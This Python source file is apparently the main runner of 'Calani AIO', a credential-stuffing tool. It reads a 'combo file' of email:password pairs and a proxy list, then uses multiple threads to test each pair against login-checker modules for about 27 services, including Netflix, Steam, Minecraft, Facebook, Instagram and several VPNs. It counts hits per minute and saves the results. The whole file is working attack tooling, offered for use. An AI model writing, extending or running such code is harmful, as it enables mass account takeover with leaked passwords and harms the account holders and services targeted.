from modules.variables import Checker
from modules.functions import *
from time import sleep
from multiprocessing.dummy import Pool
from threading import Thread

from modules.checkers import nordvpn
from modules.checkers import minecraft
from modules.checkers import bonk_io
from modules.checkers import disney
from modules.checkers import duolingo
from modules.checkers import gfuel
from modules.checkers import crunchyroll
from modules.checkers import spotifyvm
from modules.checkers import bww
from modules.checkers import pornhub
from modules.checkers import riot
from modules.checkers import honeygain
from modules.checkers import discordvm
from modules.checkers import netflix
from modules.checkers import steam
from modules.checkers import windscribe
from modules.checkers import instagram
from modules.checkers import funimation
from modules.checkers import canva
from modules.checkers import uplay
from modules.checkers import paramount
from modules.checkers import curiositystream
from modules.checkers import wemod
from modules.checkers import facebook
from modules.checkers import ipvanish
from modules.checkers import twitch
from modules.checkers import tunnelbear

modules_list = {
    "minecraft":minecraft,
    "nordvpn":nordvpn,
    "bonk.io":bonk_io,
    "disney+":disney,
    "duolingo":duolingo,
    "gfuel":gfuel,
    "crunchyroll":crunchyroll,
    "spotifyvm":spotifyvm,
    "bww":bww,
    "pornhub":pornhub,
    "riot":riot,
    "honeygain":honeygain,
    "discordvm":discordvm,
    "netflix":netflix,
    "steam":steam,
    "windscribe":windscribe,
    "instagram":instagram,
    "funimation":funimation,
    "canva":canva,
    "uplay":uplay,
    "paramount":paramount,
    "curiositystream":curiositystream,
    "wemod":wemod,
    "facebook":facebook,
    "ipvanish":ipvanish,
    "twitch":twitch,
    "tunnelbear":tunnelbear,
}

def starter(modules_lst:list):
    """Starts checking accounts"""
    reset_stats()
    set_title("Calani AIO | Getting Ready | MickeyYe#0003")
    def foo(account:str):
        try:
            email = account.split(":")[0]
            password = account.split(":")[1]
        except:
            Checker.bad += 1
            Checker.cpm += 1
            if not Checker.cui: log("bad",account,"Error")
        else:
            for module in modules_lst:
                modules_list[module].check(email,password)
            Checker.save_lines.remove(account)

    clear()
    ascii()
    print("\n\n")
    print(f"    [{cyan}Pick Combo File{reset}]")
    sleep(1)
    file_path = get_file("Combo File",type="Combo File")
    get_focus()
    if not file_path:
        print(f"    [{cyan}No File Detected{reset}]")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file:
        before_accounts = file.read().splitlines()
        accounts = list(set(before_accounts))
        Checker.accounts = list(set(before_accounts))
        Checker.save_lines = list(set(before_accounts))
        duplicates = len(before_accounts)-len(accounts)
    print(f"    [{cyan}Imported {len(before_accounts)} Accounts{reset}]")
    if duplicates != 0:
        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
    sleep(1)

    print("\n")

    print(f"    [{cyan}Pick Proxy File{reset}]")
    sleep(1)
    file_path = get_file("Proxy File File",type="Proxy File")
    get_focus()
    if not file_path:
        print(f"    [{cyan}No File Detected{reset}]")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file:
        contents = file.read()
        before_proxies = contents.splitlines()
        after_proxies = list(set(before_proxies))
        Checker.proxies = after_proxies
        duplicates = len(before_proxies)-len(after_proxies)
    print(f"    [{cyan}Imported {len(before_proxies)} Proxies{reset}]")
    if duplicates != 0:
        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
    sleep(1)

    Checker.checking = True
    Checker.time = get_time()
    makedirs(f"Results/{Checker.time}",exist_ok=True)

    Thread(target=title,args=(len(modules_lst),),daemon=True).start()
    Thread(target=level_cpm,daemon=True).start()

    clear()
    if not Checker.cui:
        ascii()
        print("\n\n")
    else: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
    mainpool = Pool(processes=Checker.threads)
    mainpool.imap_unordered(func=foo,iterable=Checker.accounts)
    mainpool.close()
    mainpool.join()
    sleep(5)
    Checker.checking = False
    print("\n\n")
    print(f"    [{cyan}Finished Checking{reset}]")
    input(f"    [{cyan}Press Enter To Go Back{reset}]")
